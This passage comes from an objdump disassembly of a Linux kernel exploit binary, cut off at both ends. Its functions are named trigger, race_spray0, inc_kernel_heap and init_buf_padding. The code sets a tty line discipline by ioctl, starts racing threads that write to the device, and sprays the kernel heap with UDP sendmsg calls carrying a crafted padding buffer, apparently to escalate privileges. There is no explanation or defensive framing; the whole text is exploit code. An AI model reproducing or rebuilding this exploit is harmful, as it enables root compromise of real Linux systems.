  4019b5:	e8 f6 f1 ff ff       	callq  400bb0 <puts@plt>
  4019ba:	bf 64 24 40 00       	mov    $0x402464,%edi
  4019bf:	e8 1c f3 ff ff       	callq  400ce0 <perror@plt>
  4019c4:	e9 b7 01 00 00       	jmpq   401b80 <trigger+0x310>
  4019c9:	48 8d 45 80          	lea    -0x80(%rbp),%rax
  4019cd:	ba 64 00 00 00       	mov    $0x64,%edx
  4019d2:	be 42 00 00 00       	mov    $0x42,%esi
  4019d7:	48 89 c7             	mov    %rax,%rdi
  4019da:	e8 41 f2 ff ff       	callq  400c20 <memset@plt>
  4019df:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4019e6:	8b 95 54 ff ff ff    	mov    -0xac(%rbp),%edx
  4019ec:	48 63 d2             	movslq %edx,%rdx
  4019ef:	8b 04 90             	mov    (%rax,%rdx,4),%eax
  4019f2:	ba 00 00 00 00       	mov    $0x0,%edx
  4019f7:	be 0a 54 00 00       	mov    $0x540a,%esi
  4019fc:	89 c7                	mov    %eax,%edi
  4019fe:	b8 00 00 00 00       	mov    $0x0,%eax
  401a03:	e8 28 f2 ff ff       	callq  400c30 <ioctl@plt>
  401a08:	89 85 5c ff ff ff    	mov    %eax,-0xa4(%rbp)
  401a0e:	83 bd 5c ff ff ff ff 	cmpl   $0xffffffff,-0xa4(%rbp)
  401a15:	75 19                	jne    401a30 <trigger+0x1c0>
  401a17:	bf 5b 25 40 00       	mov    $0x40255b,%edi
  401a1c:	e8 8f f1 ff ff       	callq  400bb0 <puts@plt>
  401a21:	bf 64 24 40 00       	mov    $0x402464,%edi
  401a26:	e8 b5 f2 ff ff       	callq  400ce0 <perror@plt>
  401a2b:	e9 50 01 00 00       	jmpq   401b80 <trigger+0x310>
  401a30:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  401a37:	8b 95 54 ff ff ff    	mov    -0xac(%rbp),%edx
  401a3d:	48 63 d2             	movslq %edx,%rdx
  401a40:	8b 04 90             	mov    (%rax,%rdx,4),%eax
  401a43:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
  401a47:	ba 64 00 00 00       	mov    $0x64,%edx
  401a4c:	48 89 ce             	mov    %rcx,%rsi
  401a4f:	89 c7                	mov    %eax,%edi
  401a51:	e8 6a f1 ff ff       	callq  400bc0 <write@plt>
  401a56:	89 85 5c ff ff ff    	mov    %eax,-0xa4(%rbp)
  401a5c:	83 bd 5c ff ff ff ff 	cmpl   $0xffffffff,-0xa4(%rbp)
  401a63:	75 10                	jne    401a75 <trigger+0x205>
  401a65:	bf 5d 25 40 00       	mov    $0x40255d,%edi
  401a6a:	e8 71 f2 ff ff       	callq  400ce0 <perror@plt>
  401a6f:	90                   	nop
  401a70:	e9 0b 01 00 00       	jmpq   401b80 <trigger+0x310>
  401a75:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  401a7c:	8b 95 54 ff ff ff    	mov    -0xac(%rbp),%edx
  401a82:	48 63 d2             	movslq %edx,%rdx
  401a85:	8b 04 90             	mov    (%rax,%rdx,4),%eax
  401a88:	48 98                	cltq   
  401a8a:	48 89 c2             	mov    %rax,%rdx
  401a8d:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
  401a94:	48 89 d1             	mov    %rdx,%rcx
  401a97:	ba 5d 0e 40 00       	mov    $0x400e5d,%edx
  401a9c:	be 00 00 00 00       	mov    $0x0,%esi
  401aa1:	48 89 c7             	mov    %rax,%rdi
  401aa4:	e8 d7 f0 ff ff       	callq  400b80 <pthread_create@plt>
  401aa9:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  401ab0:	8b 95 54 ff ff ff    	mov    -0xac(%rbp),%edx
  401ab6:	48 63 d2             	movslq %edx,%rdx
  401ab9:	8b 04 90             	mov    (%rax,%rdx,4),%eax
  401abc:	48 98                	cltq   
  401abe:	48 89 c2             	mov    %rax,%rdx
  401ac1:	48 8d 85 68 ff ff ff 	lea    -0x98(%rbp),%rax
  401ac8:	48 89 d1             	mov    %rdx,%rcx
  401acb:	ba ac 0e 40 00       	mov    $0x400eac,%edx
  401ad0:	be 00 00 00 00       	mov    $0x0,%esi
  401ad5:	48 89 c7             	mov    %rax,%rdi
  401ad8:	e8 a3 f0 ff ff       	callq  400b80 <pthread_create@plt>
  401add:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  401ae4:	be 00 00 00 00       	mov    $0x0,%esi
  401ae9:	48 89 c7             	mov    %rax,%rdi
  401aec:	e8 ff f1 ff ff       	callq  400cf0 <pthread_join@plt>
  401af1:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  401af8:	be 00 00 00 00       	mov    $0x0,%esi
  401afd:	48 89 c7             	mov    %rax,%rdi
  401b00:	e8 eb f1 ff ff       	callq  400cf0 <pthread_join@plt>
  401b05:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  401b0c:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  401b13:	48 89 c6             	mov    %rax,%rsi
  401b16:	bf 63 25 40 00       	mov    $0x402563,%edi
  401b1b:	b8 00 00 00 00       	mov    $0x0,%eax
  401b20:	e8 db f0 ff ff       	callq  400c00 <printf@plt>
  401b25:	83 85 54 ff ff ff 01 	addl   $0x1,-0xac(%rbp)
  401b2c:	8b 85 54 ff ff ff    	mov    -0xac(%rbp),%eax
  401b32:	3b 85 58 ff ff ff    	cmp    -0xa8(%rbp),%eax
  401b38:	0f 8c e0 fd ff ff    	jl     40191e <trigger+0xae>
  401b3e:	c7 85 54 ff ff ff 00 	movl   $0x0,-0xac(%rbp)
  401b45:	00 00 00 
  401b48:	eb 21                	jmp    401b6b <trigger+0x2fb>
  401b4a:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  401b51:	8b 95 54 ff ff ff    	mov    -0xac(%rbp),%edx
  401b57:	48 63 d2             	movslq %edx,%rdx
  401b5a:	8b 04 90             	mov    (%rax,%rdx,4),%eax
  401b5d:	89 c7                	mov    %eax,%edi
  401b5f:	e8 dc f0 ff ff       	callq  400c40 <close@plt>
  401b64:	83 85 54 ff ff ff 01 	addl   $0x1,-0xac(%rbp)
  401b6b:	8b 85 54 ff ff ff    	mov    -0xac(%rbp),%eax
  401b71:	3b 85 58 ff ff ff    	cmp    -0xa8(%rbp),%eax
  401b77:	7c d1                	jl     401b4a <trigger+0x2da>
  401b79:	b8 00 00 00 00       	mov    $0x0,%eax
  401b7e:	eb 45                	jmp    401bc5 <trigger+0x355>
  401b80:	c7 85 54 ff ff ff 00 	movl   $0x0,-0xac(%rbp)
  401b87:	00 00 00 
  401b8a:	eb 21                	jmp    401bad <trigger+0x33d>
  401b8c:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  401b93:	8b 95 54 ff ff ff    	mov    -0xac(%rbp),%edx
  401b99:	48 63 d2             	movslq %edx,%rdx
  401b9c:	8b 04 90             	mov    (%rax,%rdx,4),%eax
  401b9f:	89 c7                	mov    %eax,%edi
  401ba1:	e8 9a f0 ff ff       	callq  400c40 <close@plt>
  401ba6:	83 85 54 ff ff ff 01 	addl   $0x1,-0xac(%rbp)
  401bad:	8b 85 54 ff ff ff    	mov    -0xac(%rbp),%eax
  401bb3:	3b 85 58 ff ff ff    	cmp    -0xa8(%rbp),%eax
  401bb9:	7c d1                	jl     401b8c <trigger+0x31c>
  401bbb:	e8 70 fc ff ff       	callq  401830 <failed_fdexp>
  401bc0:	b8 00 00 00 00       	mov    $0x0,%eax
  401bc5:	48 89 dc             	mov    %rbx,%rsp
  401bc8:	48 8b 5d e8          	mov    -0x18(%rbp),%rbx
  401bcc:	64 48 33 1c 25 28 00 	xor    %fs:0x28,%rbx
  401bd3:	00 00 
  401bd5:	74 05                	je     401bdc <trigger+0x36c>
  401bd7:	e8 f4 ef ff ff       	callq  400bd0 <__stack_chk_fail@plt>
  401bdc:	48 8b 5d f8          	mov    -0x8(%rbp),%rbx
  401be0:	c9                   	leaveq 
  401be1:	c3                   	retq   

0000000000401be2 <init_server>:
  401be2:	55                   	push   %rbp
  401be3:	48 89 e5             	mov    %rsp,%rbp
  401be6:	48 83 ec 20          	sub    $0x20,%rsp
  401bea:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
  401bee:	89 75 e4             	mov    %esi,-0x1c(%rbp)
  401bf1:	ba 11 00 00 00       	mov    $0x11,%edx
  401bf6:	be 02 00 00 00       	mov    $0x2,%esi
  401bfb:	bf 02 00 00 00       	mov    $0x2,%edi
  401c00:	e8 5b f1 ff ff       	callq  400d60 <socket@plt>
  401c05:	89 45 f8             	mov    %eax,-0x8(%rbp)
  401c08:	83 7d f8 ff          	cmpl   $0xffffffff,-0x8(%rbp)
  401c0c:	75 14                	jne    401c22 <init_server+0x40>
  401c0e:	bf 6a 25 40 00       	mov    $0x40256a,%edi
  401c13:	e8 c8 f0 ff ff       	callq  400ce0 <perror@plt>
  401c18:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  401c1d:	e9 82 00 00 00       	jmpq   401ca4 <init_server+0xc2>
  401c22:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  401c26:	ba 10 00 00 00       	mov    $0x10,%edx
  401c2b:	be 00 00 00 00       	mov    $0x0,%esi
  401c30:	48 89 c7             	mov    %rax,%rdi
  401c33:	e8 e8 ef ff ff       	callq  400c20 <memset@plt>
  401c38:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  401c3c:	66 c7 00 02 00       	movw   $0x2,(%rax)
  401c41:	8b 45 e4             	mov    -0x1c(%rbp),%eax
  401c44:	0f b7 c0             	movzwl %ax,%eax
  401c47:	89 c7                	mov    %eax,%edi
  401c49:	e8 a2 ef ff ff       	callq  400bf0 <htons@plt>
  401c4e:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
  401c52:	66 89 42 02          	mov    %ax,0x2(%rdx)
  401c56:	bf 00 00 00 00       	mov    $0x0,%edi
  401c5b:	e8 b0 ef ff ff       	callq  400c10 <htonl@plt>
  401c60:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
  401c64:	89 42 04             	mov    %eax,0x4(%rdx)
  401c67:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
  401c6b:	8b 45 f8             	mov    -0x8(%rbp),%eax
  401c6e:	ba 10 00 00 00       	mov    $0x10,%edx
  401c73:	48 89 ce             	mov    %rcx,%rsi
  401c76:	89 c7                	mov    %eax,%edi
  401c78:	e8 43 f0 ff ff       	callq  400cc0 <bind@plt>
  401c7d:	89 45 fc             	mov    %eax,-0x4(%rbp)
  401c80:	83 7d fc ff          	cmpl   $0xffffffff,-0x4(%rbp)
  401c84:	75 1b                	jne    401ca1 <init_server+0xbf>
  401c86:	bf 71 25 40 00       	mov    $0x402571,%edi
  401c8b:	e8 50 f0 ff ff       	callq  400ce0 <perror@plt>
  401c90:	8b 45 f8             	mov    -0x8(%rbp),%eax
  401c93:	89 c7                	mov    %eax,%edi
  401c95:	e8 a6 ef ff ff       	callq  400c40 <close@plt>
  401c9a:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  401c9f:	eb 03                	jmp    401ca4 <init_server+0xc2>
  401ca1:	8b 45 f8             	mov    -0x8(%rbp),%eax
  401ca4:	c9                   	leaveq 
  401ca5:	c3                   	retq   

0000000000401ca6 <init_client>:
  401ca6:	55                   	push   %rbp
  401ca7:	48 89 e5             	mov    %rsp,%rbp
  401caa:	48 83 ec 20          	sub    $0x20,%rsp
  401cae:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
  401cb2:	89 75 e4             	mov    %esi,-0x1c(%rbp)
  401cb5:	ba 11 00 00 00       	mov    $0x11,%edx
  401cba:	be 02 00 00 00       	mov    $0x2,%esi
  401cbf:	bf 02 00 00 00       	mov    $0x2,%edi
  401cc4:	e8 97 f0 ff ff       	callq  400d60 <socket@plt>
  401cc9:	89 45 f8             	mov    %eax,-0x8(%rbp)
  401ccc:	83 7d f8 ff          	cmpl   $0xffffffff,-0x8(%rbp)
  401cd0:	75 11                	jne    401ce3 <init_client+0x3d>
  401cd2:	bf 6a 25 40 00       	mov    $0x40256a,%edi
  401cd7:	e8 04 f0 ff ff       	callq  400ce0 <perror@plt>
  401cdc:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  401ce1:	eb 70                	jmp    401d53 <init_client+0xad>
  401ce3:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  401ce7:	ba 10 00 00 00       	mov    $0x10,%edx
  401cec:	be 00 00 00 00       	mov    $0x0,%esi
  401cf1:	48 89 c7             	mov    %rax,%rdi
  401cf4:	e8 27 ef ff ff       	callq  400c20 <memset@plt>
  401cf9:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  401cfd:	66 c7 00 02 00       	movw   $0x2,(%rax)
  401d02:	8b 45 e4             	mov    -0x1c(%rbp),%eax
  401d05:	0f b7 c0             	movzwl %ax,%eax
  401d08:	89 c7                	mov    %eax,%edi
  401d0a:	e8 e1 ee ff ff       	callq  400bf0 <htons@plt>
  401d0f:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
  401d13:	66 89 42 02          	mov    %ax,0x2(%rdx)
  401d17:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  401d1b:	48 83 c0 04          	add    $0x4,%rax
  401d1f:	48 89 c6             	mov    %rax,%rsi
  401d22:	bf 76 25 40 00       	mov    $0x402576,%edi
  401d27:	e8 84 ef ff ff       	callq  400cb0 <inet_aton@plt>
  401d2c:	89 45 fc             	mov    %eax,-0x4(%rbp)
  401d2f:	83 7d fc ff          	cmpl   $0xffffffff,-0x4(%rbp)
  401d33:	75 1b                	jne    401d50 <init_client+0xaa>
  401d35:	bf 80 25 40 00       	mov    $0x402580,%edi
  401d3a:	e8 a1 ef ff ff       	callq  400ce0 <perror@plt>
  401d3f:	8b 45 f8             	mov    -0x8(%rbp),%eax
  401d42:	89 c7                	mov    %eax,%edi
  401d44:	e8 f7 ee ff ff       	callq  400c40 <close@plt>
  401d49:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  401d4e:	eb 03                	jmp    401d53 <init_client+0xad>
  401d50:	8b 45 f8             	mov    -0x8(%rbp),%eax
  401d53:	c9                   	leaveq 
  401d54:	c3                   	retq   

0000000000401d55 <client_sendmsg>:
  401d55:	55                   	push   %rbp
  401d56:	48 89 e5             	mov    %rsp,%rbp
  401d59:	48 83 ec 70          	sub    $0x70,%rsp
  401d5d:	89 7d ac             	mov    %edi,-0x54(%rbp)
  401d60:	48 89 75 a0          	mov    %rsi,-0x60(%rbp)
  401d64:	48 89 55 98          	mov    %rdx,-0x68(%rbp)
  401d68:	48 89 4d 90          	mov    %rcx,-0x70(%rbp)
  401d6c:	48 8d 45 b0          	lea    -0x50(%rbp),%rax
  401d70:	ba 10 00 00 00       	mov    $0x10,%edx
  401d75:	be 00 00 00 00       	mov    $0x0,%esi
  401d7a:	48 89 c7             	mov    %rax,%rdi
  401d7d:	e8 9e ee ff ff       	callq  400c20 <memset@plt>
  401d82:	48 8d 45 c0          	lea    -0x40(%rbp),%rax
  401d86:	ba 38 00 00 00       	mov    $0x38,%edx
  401d8b:	be 00 00 00 00       	mov    $0x0,%esi
  401d90:	48 89 c7             	mov    %rax,%rdi
  401d93:	e8 88 ee ff ff       	callq  400c20 <memset@plt>
  401d98:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  401d9c:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
  401da0:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  401da4:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
  401da8:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  401dac:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
  401db0:	c7 45 c8 10 00 00 00 	movl   $0x10,-0x38(%rbp)
  401db7:	48 8d 45 b0          	lea    -0x50(%rbp),%rax
  401dbb:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
  401dbf:	48 c7 45 d8 01 00 00 	movq   $0x1,-0x28(%rbp)
  401dc6:	00 
  401dc7:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  401dcb:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
  401dcf:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  401dd3:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  401dd7:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
  401ddb:	8b 45 ac             	mov    -0x54(%rbp),%eax
  401dde:	ba 00 00 00 00       	mov    $0x0,%edx
  401de3:	48 89 ce             	mov    %rcx,%rsi
  401de6:	89 c7                	mov    %eax,%edi
  401de8:	e8 b3 ed ff ff       	callq  400ba0 <sendmsg@plt>
  401ded:	c9                   	leaveq 
  401dee:	c3                   	retq   

0000000000401def <race_spray0>:
  401def:	55                   	push   %rbp
  401df0:	48 89 e5             	mov    %rsp,%rbp
  401df3:	53                   	push   %rbx
  401df4:	48 83 ec 58          	sub    $0x58,%rsp
  401df8:	48 89 7d a8          	mov    %rdi,-0x58(%rbp)
  401dfc:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  401e03:	00 00 
  401e05:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  401e09:	31 c0                	xor    %eax,%eax
  401e0b:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  401e0f:	89 45 b4             	mov    %eax,-0x4c(%rbp)
  401e12:	8b 55 b4             	mov    -0x4c(%rbp),%edx
  401e15:	48 8d 45 c0          	lea    -0x40(%rbp),%rax
  401e19:	89 d6                	mov    %edx,%esi
  401e1b:	48 89 c7             	mov    %rax,%rdi
  401e1e:	e8 bf fd ff ff       	callq  401be2 <init_server>
  401e23:	89 45 b8             	mov    %eax,-0x48(%rbp)
  401e26:	83 7d b8 ff          	cmpl   $0xffffffff,-0x48(%rbp)
  401e2a:	75 2a                	jne    401e56 <race_spray0+0x67>
  401e2c:	48 8b 05 cd 14 20 00 	mov    0x2014cd(%rip),%rax        # 603300 <stderr@@GLIBC_2.2.5>
  401e33:	48 89 c1             	mov    %rax,%rcx
  401e36:	ba 10 00 00 00       	mov    $0x10,%edx
  401e3b:	be 01 00 00 00       	mov    $0x1,%esi
  401e40:	bf 8a 25 40 00       	mov    $0x40258a,%edi
  401e45:	e8 c6 ee ff ff       	callq  400d10 <fwrite@plt>
  401e4a:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
  401e51:	e9 92 00 00 00       	jmpq   401ee8 <race_spray0+0xf9>
  401e56:	8b 55 b4             	mov    -0x4c(%rbp),%edx
  401e59:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
  401e5d:	89 d6                	mov    %edx,%esi
  401e5f:	48 89 c7             	mov    %rax,%rdi
  401e62:	e8 3f fe ff ff       	callq  401ca6 <init_client>
  401e67:	89 45 bc             	mov    %eax,-0x44(%rbp)
  401e6a:	83 7d bc ff          	cmpl   $0xffffffff,-0x44(%rbp)
  401e6e:	75 31                	jne    401ea1 <race_spray0+0xb2>
  401e70:	48 8b 05 89 14 20 00 	mov    0x201489(%rip),%rax        # 603300 <stderr@@GLIBC_2.2.5>
  401e77:	48 89 c1             	mov    %rax,%rcx
  401e7a:	ba 10 00 00 00       	mov    $0x10,%edx
  401e7f:	be 01 00 00 00       	mov    $0x1,%esi
  401e84:	bf 9b 25 40 00       	mov    $0x40259b,%edi
  401e89:	e8 82 ee ff ff       	callq  400d10 <fwrite@plt>
  401e8e:	8b 45 b8             	mov    -0x48(%rbp),%eax
  401e91:	89 c7                	mov    %eax,%edi
  401e93:	e8 a8 ed ff ff       	callq  400c40 <close@plt>
  401e98:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
  401e9f:	eb 47                	jmp    401ee8 <race_spray0+0xf9>
  401ea1:	c7 45 b0 00 10 00 00 	movl   $0x1000,-0x50(%rbp)
  401ea8:	eb 18                	jmp    401ec2 <race_spray0+0xd3>
  401eaa:	48 8d 75 d0          	lea    -0x30(%rbp),%rsi
  401eae:	8b 45 bc             	mov    -0x44(%rbp),%eax
  401eb1:	b9 00 20 00 00       	mov    $0x2000,%ecx
  401eb6:	ba 60 43 60 00       	mov    $0x604360,%edx
  401ebb:	89 c7                	mov    %eax,%edi
  401ebd:	e8 93 fe ff ff       	callq  401d55 <client_sendmsg>
  401ec2:	8b 45 b0             	mov    -0x50(%rbp),%eax
  401ec5:	8d 50 ff             	lea    -0x1(%rax),%edx
  401ec8:	89 55 b0             	mov    %edx,-0x50(%rbp)
  401ecb:	85 c0                	test   %eax,%eax
  401ecd:	75 db                	jne    401eaa <race_spray0+0xbb>
  401ecf:	8b 45 b8             	mov    -0x48(%rbp),%eax
  401ed2:	89 c7                	mov    %eax,%edi
  401ed4:	e8 67 ed ff ff       	callq  400c40 <close@plt>
  401ed9:	8b 45 bc             	mov    -0x44(%rbp),%eax
  401edc:	89 c7                	mov    %eax,%edi
  401ede:	e8 5d ed ff ff       	callq  400c40 <close@plt>
  401ee3:	b8 00 00 00 00       	mov    $0x0,%eax
  401ee8:	48 8b 5d e8          	mov    -0x18(%rbp),%rbx
  401eec:	64 48 33 1c 25 28 00 	xor    %fs:0x28,%rbx
  401ef3:	00 00 
  401ef5:	74 05                	je     401efc <race_spray0+0x10d>
  401ef7:	e8 d4 ec ff ff       	callq  400bd0 <__stack_chk_fail@plt>
  401efc:	48 83 c4 58          	add    $0x58,%rsp
  401f00:	5b                   	pop    %rbx
  401f01:	5d                   	pop    %rbp
  401f02:	c3                   	retq   

0000000000401f03 <init_buf_padding>:
  401f03:	55                   	push   %rbp
  401f04:	48 89 e5             	mov    %rsp,%rbp
  401f07:	48 8b 05 b2 13 20 00 	mov    0x2013b2(%rip),%rax        # 6032c0 <search_key>
  401f0e:	48 89 05 4b 24 20 00 	mov    %rax,0x20244b(%rip)        # 604360 <buf_padding>
  401f15:	48 8b 05 ac 13 20 00 	mov    0x2013ac(%rip),%rax        # 6032c8 <search_key+0x8>
  401f1c:	48 89 05 45 24 20 00 	mov    %rax,0x202445(%rip)        # 604368 <buf_padding+0x8>
  401f23:	48 8b 05 a6 13 20 00 	mov    0x2013a6(%rip),%rax        # 6032d0 <search_key+0x10>
  401f2a:	48 89 05 3f 24 20 00 	mov    %rax,0x20243f(%rip)        # 604370 <buf_padding+0x10>
  401f31:	0f b7 05 a0 13 20 00 	movzwl 0x2013a0(%rip),%eax        # 6032d8 <search_key+0x18>
  401f38:	66 89 05 39 24 20 00 	mov    %ax,0x202439(%rip)        # 604378 <buf_padding+0x18>
  401f3f:	b8 7a 43 60 00       	mov    $0x60437a,%eax
  401f44:	48 8b 15 75 13 20 00 	mov    0x201375(%rip),%rdx        # 6032c0 <search_key>
  401f4b:	48 89 10             	mov    %rdx,(%rax)
  401f4e:	48 8b 15 73 13 20 00 	mov    0x201373(%rip),%rdx        # 6032c8 <search_key+0x8>
  401f55:	48 89 50 08          	mov    %rdx,0x8(%rax)
  401f59:	48 8b 15 70 13 20 00 	mov    0x201370(%rip),%rdx        # 6032d0 <search_key+0x10>
  401f60:	48 89 50 10          	mov    %rdx,0x10(%rax)
  401f64:	0f b7 15 6d 13 20 00 	movzwl 0x20136d(%rip),%edx        # 6032d8 <search_key+0x18>
  401f6b:	66 89 50 18          	mov    %dx,0x18(%rax)
  401f6f:	ba b2 1f 00 00       	mov    $0x1fb2,%edx
  401f74:	be 41 00 00 00       	mov    $0x41,%esi
  401f79:	bf 94 43 60 00       	mov    $0x604394,%edi
  401f7e:	e8 9d ec ff ff       	callq  400c20 <memset@plt>
  401f83:	5d                   	pop    %rbp
  401f84:	c3                   	retq   

0000000000401f85 <inc_kernel_heap>:
  401f85:	55                   	push   %rbp
  401f86:	48 89 e5             	mov    %rsp,%rbp
  401f89:	41 57                	push   %r15
  401f8b:	41 56                	push   %r14
  401f8d:	41 55                	push   %r13
  401f8f:	41 54                	push   %r12
  401f91:	53                   	push   %rbx
  401f92:	48 81 ec 38 01 00 00 	sub    $0x138,%rsp
  401f99:	48 89 e0             	mov    %rsp,%rax
  401f9c:	48 89 c3             	mov    %rax,%rbx
  401f9f:	e8 5f ff ff ff       	callq  401f03 <init_buf_padding>
  401fa4:	48 8d 85 d0 fe ff ff 	lea    -0x130(%rbp),%rax
  401fab:	48 89 c6             	mov    %rax,%rsi
  401fae:	bf 07 00 00 00       	mov    $0x7,%edi
  401fb3:	e8 68 ed ff ff       	callq  400d20 <getrlimit@plt>
  401fb8:	89 85 b4 fe ff ff    	mov    %eax,-0x14c(%rbp)
  401fbe:	83 bd b4 fe ff ff ff 	cmpl   $0xffffffff,-0x14c(%rbp)
  401fc5:	75 14                	jne    401fdb <inc_kernel_heap+0x56>
  401fc7:	bf ac 25 40 00       	mov    $0x4025ac,%edi
  401fcc:	e8 0f ed ff ff       	callq  400ce0 <perror@plt>
  401fd1:	bf ff ff ff ff       	mov    $0xffffffff,%edi
  401fd6:	e8 25 ed ff ff       	callq  400d00 <exit@plt>
  401fdb:	c7 85 b8 fe ff ff 01 	movl   $0x1,-0x148(%rbp)
  401fe2:	00 00 00 
  401fe5:	8b 85 b8 fe ff ff    	mov    -0x148(%rbp),%eax
  401feb:	48 63 d0             	movslq %eax,%rdx
  401fee:	48 83 ea 01          	sub    $0x1,%rdx
  401ff2:	48 89 95 c0 fe ff ff 	mov    %rdx,-0x140(%rbp)
  401ff9:	48 63 d0             	movslq %eax,%rdx
  401ffc:	49 89 d6             	mov    %rdx,%r14
  401fff:	41 bf 00 00 00 00    	mov    $0x0,%r15d
  402005:	48 63 d0             	movslq %eax,%rdx
  402008:	49 89 d4             	mov    %rdx,%r12
  40200b:	41 bd 00 00 00 00    	mov    $0x0,%r13d
  402011:	48 98                	cltq   
  402013:	48 c1 e0 02          	shl    $0x2,%rax
  402017:	48 8d 50 03          	lea    0x3(%rax),%rdx
  40201b:	b8 10 00 00 00       	mov    $0x10,%eax
  402020:	48 83 e8 01          	sub    $0x1,%rax
  402024:	48 01 d0             	add    %rdx,%rax
  402027:	be 10 00 00 00       	mov    $0x10,%esi
  40202c:	ba 00 00 00 00       	mov    $0x0,%edx
  402031:	48 f7 f6             	div    %rsi
  402034:	48 6b c0 10          	imul   $0x10,%rax,%rax
  402038:	48 29 c4             	sub    %rax,%rsp
  40203b:	48 89 e0             	mov    %rsp,%rax
  40203e:	48 83 c0 03          	add    $0x3,%rax
  402042:	48 c1 e8 02          	shr    $0x2,%rax
  402046:	48 c1 e0 02          	shl    $0x2,%rax
  40204a:	48 89 85 c8 fe ff ff 	mov    %rax,-0x138(%rbp)
  402051:	c7 85 ac fe ff ff 00 	movl   $0x0,-0x154(%rbp)
  402058:	00 00 00 
  40205b:	e9 ed 00 00 00       	jmpq   40214d <inc_kernel_heap+0x1c8>
  402060:	be 02 00 00 00       	mov    $0x2,%esi
  402065:	bf 4a 25 40 00       	mov    $0x40254a,%edi
  40206a:	b8 00 00 00 00       	mov    $0x0,%eax
  40206f:	e8 5c ec ff ff       	callq  400cd0 <open@plt>
  402074:	48 8b 95 c8 fe ff ff 	mov    -0x138(%rbp),%rdx
  40207b:	8b 8d ac fe ff ff    	mov    -0x154(%rbp),%ecx
  402081:	48 63 c9             	movslq %ecx,%rcx
  402084:	89 04 8a             	mov    %eax,(%rdx,%rcx,4)
  402087:	48 8b 85 c8 fe ff ff 	mov    -0x138(%rbp),%rax
  40208e:	8b 95 ac fe ff ff    	mov    -0x154(%rbp),%edx
  402094:	48 63 d2             	movslq %edx,%rdx
  402097:	8b 04 90             	mov    (%rax,%rdx,4),%eax
  40209a:	83 f8 ff             	cmp    $0xffffffff,%eax
  40209d:	0f 84 a3 00 00 00    	je     402146 <inc_kernel_heap+0x1c1>
  4020a3:	c7 85 e0 fe ff ff 0d 	movl   $0xd,-0x120(%rbp)
  4020aa:	00 00 00 
  4020ad:	48 8b 85 c8 fe ff ff 	mov    -0x138(%rbp),%rax
  4020b4:	8b 95 ac fe ff ff    	mov    -0x154(%rbp),%edx
  4020ba:	48 63 d2             	movslq %edx,%rdx
  4020bd:	8b 04 90             	mov    (%rax,%rdx,4),%eax
  4020c0:	48 8d 95 e0 fe ff ff 	lea    -0x120(%rbp),%rdx
  4020c7:	be 23 54 00 00       	mov    $0x5423,%esi
  4020cc:	89 c7                	mov    %eax,%edi
  4020ce:	b8 00 00 00 00       	mov    $0x0,%eax
  4020d3:	e8 58 eb ff ff       	callq  400c30 <ioctl@plt>
  4020d8:	89 85 bc fe ff ff    	mov    %eax,-0x144(%rbp)
  4020de:	83 bd bc fe ff ff ff 	cmpl   $0xffffffff,-0x144(%rbp)
  4020e5:	75 3b                	jne    402122 <inc_kernel_heap+0x19d>
  4020e7:	bf b6 25 40 00       	mov    $0x4025b6,%edi
  4020ec:	e8 bf ea ff ff       	callq  400bb0 <puts@plt>
  4020f1:	48 8b 85 c8 fe ff ff 	mov    -0x138(%rbp),%rax
  4020f8:	8b 95 ac fe ff ff    	mov    -0x154(%rbp),%edx
  4020fe:	48 63 d2             	movslq %edx,%rdx
  402101:	8b 04 90             	mov    (%rax,%rdx,4),%eax
  402104:	89 c7                	mov    %eax,%edi
  402106:	e8 35 eb ff ff       	callq  400c40 <close@plt>
  40210b:	48 8b 85 c8 fe ff ff 	mov    -0x138(%rbp),%rax
  402112:	8b 95 ac fe ff ff    	mov    -0x154(%rbp),%edx
  402118:	48 63 d2             	movslq %edx,%rdx
  40211b:	c7 04 90 ff ff ff ff 	movl   $0xffffffff,(%rax,%rdx,4)
  402122:	48 8b 85 c8 fe ff ff 	mov    -0x138(%rbp),%rax
  402129:	8b 95 ac fe ff ff    	mov    -0x154(%rbp),%edx
